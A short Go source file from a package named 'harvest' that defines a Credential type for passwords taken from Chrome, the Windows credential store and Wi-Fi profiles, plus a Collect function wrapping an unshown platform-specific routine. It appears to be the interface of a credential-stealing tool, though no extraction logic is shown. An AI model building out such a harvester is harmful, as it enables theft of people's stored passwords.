package harvest

// Credential holds a harvested credential entry.
type Credential struct {
	Source   string // "chrome", "wincred", "wifi"
	URL      string
	Username string
	Password string
}

// Collect gathers all available credentials on the current platform.
func Collect() []Credential {
	return collect()
}
